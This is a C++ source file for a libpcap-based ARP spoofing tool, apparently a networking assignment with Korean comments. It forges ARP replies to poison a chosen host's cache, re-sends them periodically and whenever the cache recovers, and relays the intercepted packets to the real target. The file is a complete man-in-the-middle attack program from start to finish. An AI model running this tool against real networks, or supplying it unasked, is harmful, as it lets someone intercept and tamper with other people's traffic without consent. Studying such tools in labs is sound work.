#include "headers.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

#pragma pack(push, 1)
struct EthIpPacket final {
	EthHdr eth_;
	IpHdr ip_;
};
#pragma pack(pop)

#pragma pack(push, 1)
struct FlowInfo final {
	Ip attackerIp = Ip(0);
	Ip senderIp = Ip(0);
	Ip targetIp = Ip(0);
	Mac attackerMac = Mac::nullMac();
	Mac senderMac = Mac::nullMac();
	Mac targetMac = Mac::nullMac();
	EthArpPacket infectPkt;
};
#pragma pack(pop)


void signal_handler (int sig);
void GetMyInfo(Ip* myIp, Mac* myMac, char* dev);
Mac GetMac_ByIp(pcap_t* handle, Ip myIp, Mac myMac, Ip Ip);
EthArpPacket MakeArpPacket(int mode, pcap_t* handle, Mac eth_smac, Mac eth_dmac, Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip);
void SendArpPacket(pcap_t* handle, EthArpPacket packet);
void SendIpPacket(pcap_t* handle, EthIpPacket packet, int size);
bool isSpoofed(const u_char *replyPacket, FlowInfo info);
bool isRecovered(const u_char *replyPacket, FlowInfo info);
bool ReInfect(const u_char *replyPacket, FlowInfo info);
void Relay(pcap_t* handle, struct pcap_pkthdr* header, const u_char *replyPacket, FlowInfo info);
void Infect(pcap_t *handle);
void Receive(pcap_t* handle);

bool runThread = true;

std::list<FlowInfo> flows;
std::map<Ip, Mac> arpTable;

void usage() {
	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

void signal_handler (int sig)
{
    printf("\nInterrupt Executed : %d\n",sig);
    runThread = false;
	sleep(2);
	return;
}

void GetMyInfo(Ip* myIp, Mac* myMac, char* dev){
	int fd;
	struct ifreq ifr;

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if(fd<0){
		fprintf(stderr, "Fail Open Socket return %d\n",fd);
		exit(-1);
	}
	ifr.ifr_addr.sa_family = AF_INET;

	memcpy(ifr.ifr_name, dev, IFNAMSIZ -1);

	if(!ioctl(fd, SIOCGIFHWADDR, &ifr))
		*myMac = Mac((uint8_t *)(ifr.ifr_hwaddr.sa_data));
    
    if(!ioctl(fd, SIOCGIFADDR, &ifr))
		*myIp = Ip(std::string(inet_ntoa(((struct sockaddr_in* )&ifr.ifr_addr)->sin_addr)));
	
	close(fd);
	return;
}


Mac GetMac_ByIp(pcap_t* handle, Ip myIp, Mac myMac, Ip Ip){
	Mac broadcast = Mac::broadcastMac();
	Mac unknown = Mac::nullMac();

	struct pcap_pkthdr* header;
	const u_char* replyPacket;

	while(true){
		// mode : 0 = request, 1 = reply
		// eth_smac, eth_dmac, arp_smac, arp_sip, arp_tmac, arp_tip
		EthArpPacket packet = MakeArpPacket(0, handle, myMac, broadcast, myMac, myIp, unknown, Ip);
		SendArpPacket(handle, packet);
	
		int res = pcap_next_ex(handle, &header, &replyPacket);
		if (res == 0) return 0;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			exit(-1);
		}
		
		EthArpPacket* resPacket;

		resPacket = (struct EthArpPacket *)replyPacket;
		if(resPacket->eth_.type() == EthHdr::Arp){
			if(resPacket->arp_.sip() == Ip && resPacket->arp_.tip() == myIp)
				return Mac((uint8_t*)(resPacket->arp_.smac_));
			else continue;
		}
	}
	return Mac::nullMac();
}

// mode : 0 = request, 1 = reply
EthArpPacket MakeArpPacket(int mode, pcap_t* handle, Mac eth_smac, Mac eth_dmac, Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip){
	EthArpPacket packet;

	packet.eth_.smac_ = eth_smac;
    packet.eth_.dmac_ = eth_dmac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    if(mode == 0){
        packet.arp_.op_ = htons(ArpHdr::Request);
    }else if(mode == 1){
        packet.arp_.op_ = htons(ArpHdr::Reply);
    }
    packet.arp_.smac_ = arp_smac;
    packet.arp_.sip_ = htonl(arp_sip);
    packet.arp_.tmac_ = arp_tmac;
    packet.arp_.tip_ = htonl(arp_tip);
	return packet;
}


void SendArpPacket(pcap_t* handle, EthArpPacket packet){
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "Send Arp Failed return %d error=%s\n", res, pcap_geterr(handle));
	}
	return;
}

void SendIpPacket(pcap_t* handle, EthIpPacket packet, int size){
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), size);
	if (res != 0) {
		fprintf(stderr, "Send Ip Failed return %d error=%s\n", res, pcap_geterr(handle));
	}
	return;
}

bool isSpoofed(const u_char *replyPacket, FlowInfo info){
	EthHdr *eth = (struct EthHdr *)replyPacket;
	if (eth->type() == EthHdr::Ip4){
		EthIpPacket *ipPacket = (struct EthIpPacket *)replyPacket;

		// Udp의 broadcast -> relay 필요 없음
		if (ipPacket->ip_.p() == IpHdr::Udp){
			if (ipPacket->eth_.dmac() == info.attackerMac)
				return false;
			if (ipPacket->eth_.dmac() == info.targetMac)
				return false;
			if (ipPacket->eth_.dmac() == Mac::broadcastMac())
				return false;
		}

		// sender가 보낸 패킷 -> spoof 됨 -> relay 필요
		if (ipPacket->ip_.sip() == info.senderIp && ipPacket->eth_.smac() == info.senderMac){
			// 원래 나한테 보내려던 패킷 -> relay 필요 없음
			if (ipPacket->ip_.dip() == info.attackerIp)
				return false;
			return true;
		}
	}
	return false;
}

bool isRecovered(const u_char *replyPacket, FlowInfo info){
	EthHdr *eth = (struct EthHdr *)replyPacket;
	if (eth->type() == EthHdr::Arp){
		EthArpPacket *arpPacket = (struct EthArpPacket *)replyPacket;
		if (arpPacket->arp_.op() == ArpHdr::Request){
			// // target mac recover 위해서 broadcast 하는 경우 -> recover 필요
			if (arpPacket->arp_.tip() == info.targetIp){
				return true;
			}
		}
	}
	return false;
}

void Infect(pcap_t *handle){
	while(runThread){
		for(auto iter : flows){
			SendArpPacket(handle, iter.infectPkt);
			printf("Infect : [%s]\n",std::string(iter.senderIp).c_str());
			sleep(0.1);
		}
		sleep(20);
	}
}

void ReInfect(pcap_t *handle, FlowInfo info){
	SendArpPacket(handle, info.infectPkt);
	printf("ReInfect : [%s]\n",std::string(info.senderIp).c_str());
}

void Relay(pcap_t* handle, struct pcap_pkthdr* header, const u_char *replyPacket, FlowInfo info){
	EthIpPacket *ipPacket = (struct EthIpPacket *)replyPacket;
	ipPacket->eth_.smac_ = info.attackerMac;
	ipPacket->eth_.dmac_ = info.targetMac;
	SendIpPacket(handle, *ipPacket, header->len);
	printf("Relay : [%s]\n",std::string(info.senderIp).c_str());
}

void Receive(pcap_t* handle){
	struct pcap_pkthdr* header;
	const u_char* replyPacket;
	while(runThread){
		int res = pcap_next_ex(handle, &header, &replyPacket);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}

		for(auto iter: flows){
			// spoofed -> relay
			if(isSpoofed(replyPacket, iter))
				Relay(handle, header, replyPacket, iter);
			// recovered -> reinfect
			if(isRecovered(replyPacket,iter))
				ReInfect(handle, iter);
		}
	}
}

int main(int argc, char* argv[]) {
	if (argc < 4 || argc%2 ) {
		printf("%d\n",argc);
		usage();
		return -1;
	}

	char* dev = argv[1];

	Ip attackerIp; 
	Mac attackerMac;
	
	GetMyInfo(&attackerIp, &attackerMac, dev);
	printf("\n-------------[ATTACKER]-------------\n");
	printf("[ATTACKER MAC ADDR = %s]\n", std::string(attackerMac).c_str());
	printf("[ATTACKER IP ADDR = %s]\n", std::string(attackerIp).c_str());
	arpTable[attackerIp] = attackerMac;

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
	for(int i=1;i<argc/2;i++){
		FlowInfo info;
		info.attackerIp = attackerIp;
		info.attackerMac = attackerMac;
		info.senderIp = Ip(argv[2*i]);
		info.targetIp = Ip(argv[2*i+1]);

		//arpTable에 senderIp에 대한 정보가 있는지 확인
		if(!arpTable.count(info.senderIp))
			arpTable[info.senderIp] = GetMac_ByIp(handle, attackerIp, attackerMac, info.senderIp);

		if(!arpTable.count(info.targetIp))
			arpTable[info.targetIp] = GetMac_ByIp(handle, attackerIp, attackerMac, info.targetIp);

		info.senderMac = arpTable[info.senderIp];
		info.targetMac = arpTable[info.targetIp];

		printf("\n-------------[SENDER]-------------\n");
		printf("[SENDER MAC ADDR = %s]\n", std::string(info.senderMac).c_str());
		printf("[SENDER IP ADDR = %s]\n", std::string(info.senderIp).c_str());

		printf("\n-------------[TARGET]-------------\n");
		printf("[TARGET MAC ADDR = %s]\n", std::string(info.targetMac).c_str());
		printf("[TARGET IP ADDR = %s]\n", std::string(info.targetIp).c_str());
		
		// sender 감염위해 Flow 생성
		info.infectPkt = MakeArpPacket(1, handle, info.attackerMac, info.senderMac, info.attackerMac, info.targetIp, info.senderMac, info.senderIp);
		flows.push_back(info);
		printf("Making Sender Infect Flow Done!! \n");

		// // target도 감염위해 Flow 생성
		// info.senderIp = Ip(argv[2*i+1]);
		// info.targetIp = Ip(argv[2*i]);
		// info.senderMac = arpTable[info.senderIp];
		// info.targetMac = arpTable[info.targetIp];
		// info.infectPkt = MakeArpPacket(1, handle, info.attackerMac, info.senderMac, info.attackerMac, info.targetIp, info.senderMac, info.senderIp);
		// flows.push_back(info);

		printf("Making Target Infect Flow Done!! \n");

	}
	printf("\n-------------Start Spoofing!!!!-------------\n");
	std::thread infect_t(Infect, handle);
	std::thread receive_t(Receive, handle);
	
	signal(SIGINT, signal_handler);

	infect_t.join();
	receive_t.join();

	pcap_close(handle);

	printf("\n-------------End Spoofing!!!!-------------\n");


}
